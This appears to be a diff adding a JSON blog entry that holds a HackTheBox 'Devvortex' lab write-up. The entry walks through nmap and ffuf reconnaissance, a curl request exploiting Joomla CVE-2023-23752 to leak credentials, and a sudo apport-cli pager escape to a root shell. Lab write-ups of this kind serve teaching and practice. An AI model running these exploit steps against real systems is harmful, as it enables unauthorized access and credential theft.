@@ -1,0 +1,74 @@
+{
+  "id": "htb-machine-devvortex",
+  "title": "HackTheBox: Devvortex",
+  "slug": "htb-devvortex",
+  "category": "ctf",
+  "tags": [
+    "HackTheBox",
+    "Linux",
+    "Web",
+    "Joomla",
+    "MySQL"
+  ],
+  "difficulty": "Easy",
+  "date": "2024-12-15",
+  "summary": "Exploiting Joomla CVE-2023-23752 to gain initial access, then leveraging MySQL credentials for privilege escalation via apport-cli.",
+  "platform": "HackTheBox",
+  "content": [
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Reconnaissance"
+    },
+    {
+      "type": "paragraph",
+      "text": "Starting with an nmap scan to identify open ports and services."
+    },
+    {
+      "type": "code",
+      "language": "bash",
+      "code": "nmap -sC -sV -oA nmap/devvortex 10.10.11.242\n\n# Results:\n# PORT   STATE SERVICE VERSION\n# 22/tcp open  ssh     OpenSSH 8.2p1\n# 80/tcp open  http    nginx 1.18.0"
+    },
+    {
+      "type": "paragraph",
+      "text": "Found a web server running nginx. Let's enumerate subdomains."
+    },
+    {
+      "type": "code",
+      "language": "bash",
+      "code": "ffuf -u http://devvortex.htb -H \"Host: FUZZ.devvortex.htb\" -w /usr/share/wordlists/subdomains.txt\n\n# Found: dev.devvortex.htb"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Exploitation"
+    },
+    {
+      "type": "paragraph",
+      "text": "The dev subdomain runs Joomla 4.2.6, vulnerable to CVE-2023-23752 (Information Disclosure)."
+    },
+    {
+      "type": "code",
+      "language": "bash",
+      "code": "curl -s \"http://dev.devvortex.htb/api/index.php/v1/config/application?public=true\" | jq\n\n# Leaked credentials:\n# user: lewis\n# password: P4ntherg0t1n5r3c0n##"
+    },
+    {
+      "type": "heading",
+      "level": 2,
+      "text": "Privilege Escalation"
+    },
+    {
+      "type": "paragraph",
+      "text": "After gaining shell access, found MySQL credentials and escalated via apport-cli vulnerability."
+    },
+    {
+      "type": "code",
+      "language": "bash",
+      "code": "sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash\n# Press 'V' to view report\n# In less, type: !/bin/bash\n# Got root shell!"
+    },
+    {
+      "type": "flag",
+      "text": "HTB{fl4g_w0uld_b3_h3r3}"
+    }
+  ]
+}
